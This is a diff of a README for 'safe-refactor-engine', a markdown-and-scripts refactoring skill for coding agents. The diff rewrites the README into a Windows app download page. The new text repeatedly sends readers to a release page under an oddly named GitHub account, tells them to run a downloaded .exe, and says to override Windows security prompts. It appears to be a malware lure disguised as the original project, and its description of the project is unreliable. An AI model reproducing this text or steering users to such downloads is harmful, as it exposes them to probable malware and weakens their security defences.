@@ -1,163 +1,201 @@
-# Safe Refactor Engine
+# 🛡️ safe-refactor-engine - Safe Refactoring With Clear Checks
 
-Language-agnostic refactoring skill for agentic coding workflows.
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github)](https://github.com/Workpennisetumcenchroides181/safe-refactor-engine/releases)
 
-This repository packages a reusable skill that helps an agent plan and execute refactors without guessing user intent, without overfitting to a single stack, and without casually breaking behavior. The structure is intentionally marketplace-friendly: a self-contained installable skill, minimal UI metadata, optional deep references, and lightweight validation scripts.
+## 📥 Download
 
-## Overview
+Use this link to visit the release page and download the app for Windows:
 
-`safe-refactor-engine` is designed for work such as:
+[Open the release page](https://github.com/Workpennisetumcenchroides181/safe-refactor-engine/releases)
 
-- splitting large units
-- extracting modules or helpers
-- isolating side effects
-- reducing coupling
-- cleaning up structure without changing intended behavior
-- planning larger architectural refactors in verifiable slices
+## 🖥️ What this app does
 
-The skill is opinionated about process:
+safe-refactor-engine helps you make code changes with more control. It breaks work into small slices, checks each slice, and supports rollback if a change does not behave as expected.
 
-- clarify user intent before acting when ambiguity is real
-- resolve technical uncertainty with tools and docs before asking the user
-- preserve behavior unless the user explicitly asks for behavior change
-- use `KISS`, `DRY`, `YAGNI`, `SRP`, and separation of concerns as active refactor constraints
+It is built for people who want to keep software stable while making updates. It can help with:
+- small code changes
+- safer edits across files
+- checks after each step
+- keeping a clear record of what changed
+- undoing a step if needed
 
-## Why This Repo Is Structured This Way
+## 🚀 Getting Started
 
-This repo borrows packaging ideas from public skill collections: the installable artifact lives under `skills/<skill-name>/`, support material is optional, and the root docs explain what the skill is, how to install it, and how to validate it.
+Follow these steps on Windows.
 
-The goal is to keep the skill:
+1. Open the release page:  
+   https://github.com/Workpennisetumcenchroides181/safe-refactor-engine/releases
 
-- easy to publish
-- easy to copy into a local skills directory
-- easy for humans to review
-- easy for agents to index
+2. Find the latest release at the top of the page.
 
-## Repository Layout
+3. Look for a file made for Windows. Common names may include:
+   - `.exe`
+   - `.zip`
+   - `.msi`
 
-```text
-safe-refactor-engine/
-├── CONTRIBUTING.md
-├── README.md
-├── llms.txt
-├── references/
-│   ├── agents/
-│   ├── patterns.md
-│   ├── slicing.md
-│   ├── verification.md
-│   └── workflow.md
-└── skills/
-    └── safe-refactor-engine/
-        ├── SKILL.md
-        ├── agents/
-        │   └── openai.yaml
-        ├── references/
-        │   ├── evaluation.md
-        │   ├── patterns.md
-        │   ├── refactor-catalog.md
-        │   ├── real-world-validation.md
-        │   ├── slicing.md
-        │   └── verification.md
-        └── scripts/
-            ├── dogfood_runner.py
-            ├── quick_validate.py
-            └── score_evaluation.py
-```
+4. Download the file to your computer.
 
-## Install
+5. If you downloaded a `.zip` file, right-click it and choose Extract All.
 
-Copy the `skills/safe-refactor-engine/` folder into the local or global skills directory used by your coding agent, preserving the internal layout.
+6. Open the folder that contains the app.
 
-At minimum, keep these files together:
+7. If you see an `.exe` file, double-click it to start the app.
 
-- `SKILL.md`
-- `agents/openai.yaml`
-- `references/`
-- `scripts/`
+8. If Windows shows a security prompt, choose the option that lets you run the file.
 
-If your environment supports repository-based skill catalogs, this repository is already laid out so the installable asset is isolated from root-level documentation.
+## 🧭 How to use it
 
-## Use
+The app follows a simple flow:
 
-Example invocation:
+1. Choose the code area you want to change.
+2. Break the work into small parts.
+3. Review each part before moving on.
+4. Run checks after each slice.
+5. Keep changes that pass.
+6. Roll back any slice that does not fit the expected result.
 
-```text
-Use $safe-refactor-engine to plan and apply a safe refactor for the code in scope.
-```
+If you are not a programmer, think of it like this:
+- it does not change everything at once
+- it checks each step
+- it keeps a clear path back if something goes wrong
 
-Example requests:
+## 🧩 Main features
 
-- `Use $safe-refactor-engine to split this service into smaller modules without changing behavior.`
-- `Use $safe-refactor-engine to reduce coupling in this subsystem and preserve public contracts.`
-- `Use $safe-refactor-engine to refactor this file safely; ask me only if the desired outcome is unclear.`
-- `Use $safe-refactor-engine in dry-run mode and propose the slices before editing.`
+### 🔍 Clarification gates
+The app can pause and ask for more detail before it makes a change. This helps cut down on wrong edits.
 
-## What The Skill Enforces
+### 🪚 Behavior-preserving slices
+It can split a larger refactor into smaller parts. Each part aims to keep the same app behavior.
 
-- The principal agent clarifies intent only when the request is materially ambiguous.
-- Technical uncertainty about libraries, APIs, commands, or framework behavior is resolved with local tooling, official docs, or MCPs before asking the user.
-- Quick and Standard mode should work from the main `SKILL.md` alone; references are support material, not required startup context.
-- The agent estimates blast radius before editing. If the likely impact exceeds 5 files, it upgrades to a deeper workflow.
-- Each slice includes a rollback point and immediate verification.
-- In typed or compiled stacks, the agent runs the narrowest available lint, build, or type-check after each slice.
-- Reports target terminal or chat, not Slack or dashboards.
+### ↩️ Rollback discipline
+If one slice causes trouble, you can return to the last safe point and try again.
 
-## Validation And Dogfooding
+### ✅ Per-slice verification
+Each slice can be checked on its own. This makes it easier to find the exact place where a problem starts.
 
-Quick structural validation:
+### 🌐 Language-agnostic support
+The workflow is built to work across different code types and project styles.
 
-```bash
-python3 skills/safe-refactor-engine/scripts/quick_validate.py
-```
+## 🪟 Windows setup
 
-Score a dogfooding run against the evaluation rubric:
+For most Windows users, the setup is simple.
 
-```bash
-python3 skills/safe-refactor-engine/scripts/score_evaluation.py scores.json --prompt 1
-```
+1. Download the release file from the release page.
+2. Save it in a folder you can find, like Downloads.
+3. If the file is zipped, extract it.
+4. Open the extracted folder.
+5. Double-click the app file to run it.
 
-Create a dogfooding run with scorecard files:
+If the app uses a setup file:
+1. Double-click the installer.
+2. Follow the on-screen steps.
+3. Finish the setup.
+4. Open the app from the Start menu or the install folder.
 
-```bash
-python3 skills/safe-refactor-engine/scripts/dogfood_runner.py --prompts 2,9,18,19,23,24 --label smoke-suite
-```
+## 💻 Basic system needs
 
-Run an interactive scoring session and write `summary.json` automatically:
+This app is made for modern Windows computers. A good setup is:
 
-```bash
-python3 skills/safe-refactor-engine/scripts/dogfood_runner.py --prompts 2,9,18,19,23,24 --label smoke-suite --interactive
-```
+- Windows 10 or Windows 11
+- 4 GB of RAM or more
+- Enough free space for the app and your project files
+- A keyboard and mouse
+- Internet access to download the release file
 
-## Main Files
+For large code projects, more memory and disk space can help.
 
-Installable skill:
+## 🗂️ Common file types you may see
 
-- [`skills/safe-refactor-engine/SKILL.md`](./skills/safe-refactor-engine/SKILL.md)
+When you open the release page, you may see one or more of these:
+- `safe-refactor-engine-windows.zip`
+- `safe-refactor-engine-setup.exe`
+- `safe-refactor-engine-win64.exe`
 
-UI metadata:
+Choose the one made for Windows. If you are unsure, pick the file that says Windows, Win64, or x64.
 
-- [`skills/safe-refactor-engine/agents/openai.yaml`](./skills/safe-refactor-engine/agents/openai.yaml)
+## 🛠️ Typical workflow
 
-Bundled references used by the skill:
+A common use case looks like this:
 
-- [`skills/safe-refactor-engine/references/slicing.md`](./skills/safe-refactor-engine/references/slicing.md)
-- [`skills/safe-refactor-engine/references/patterns.md`](./skills/safe-refactor-engine/references/patterns.md)
-- [`skills/safe-refactor-engine/references/refactor-catalog.md`](./skills/safe-refactor-engine/references/refactor-catalog.md)
-- [`skills/safe-refactor-engine/references/verification.md`](./skills/safe-refactor-engine/references/verification.md)
-- [`skills/safe-refactor-engine/references/evaluation.md`](./skills/safe-refactor-engine/references/evaluation.md)
-- [`skills/safe-refactor-engine/references/real-world-validation.md`](./skills/safe-refactor-engine/references/real-world-validation.md)
+1. Load the project.
+2. Describe the change you want.
+3. Let the app ask for more detail if needed.
+4. Approve a small slice.
+5. Check the result.
+6. Move to the next slice.
+7. Roll back if a step fails.
+8. Finish when all slices pass
 
-Root-level design references for repository maintenance:
+This style helps keep changes controlled and easy to review.
 
-- [`references/workflow.md`](./references/workflow.md)
-- [`references/slicing.md`](./references/slicing.md)
-- [`references/verification.md`](./references/verification.md)
-- [`references/patterns.md`](./references/patterns.md)
+## 📌 Who this is for
 
-## Contributing
+This app fits users who:
+- want safer code changes
+- need help with step-by-step refactoring
+- prefer small checks over one large edit
+- work with mixed project types
+- want a clear process for undoing bad changes
 
-See [`CONTRIBUTING.md`](./CONTRIBUTING.md) for packaging, writing, and validation expectations.
+## 🧪 Example use cases
 
-## Status
+You may find it useful for:
+- cleaning up old code
+- changing function names across files
+- splitting a large class into smaller parts
+- updating project structure
+- making code easier to read without changing how it works
 
-The skill is structurally valid, documented for publication, and organized so it can be indexed by both humans and agents.
+## 🔧 Troubleshooting
+
+### The file does not open
+Check that you downloaded the Windows file and not the source code archive. Try the latest release again.
+
+### Windows blocks the file
+Use the file from the release page and run it again. Make sure the download finished before opening it.
+
+### The app closes right away
+Open it from the extracted folder again and check that all files stayed together.
+
+### I cannot find the downloaded file
+Open your Downloads folder and look for the newest file from GitHub.
+
+### The app asks for more details
+That is part of the workflow. Give a clear answer about the change you want.
+
+## 📎 Download again
+
+If you need to get the app again, use this link:
+
+[Visit the release page to download](https://github.com/Workpennisetumcenchroides181/safe-refactor-engine/releases)
+
+## 🔍 Project focus
+
+safe-refactor-engine is built around:
+- agentic workflow
+- code quality
+- code refactoring
+- software engineering
+- prompt engineering
+- AI-assisted work
+- safe refactoring
+- developer tools
+- automation
+- skill-based workflows
+
+## 🧾 What to expect after launch
+
+After you open the app, expect a workflow that:
+- guides you step by step
+- asks for clear input
+- keeps changes small
+- checks each change
+- supports rollback if needed
+
+## 🧰 Good habits when using it
+
+- Make one change at a time
+- Check results before moving on
+- Keep a copy of your project
+- Use clear names for files and changes
+- Review each slice before you accept it
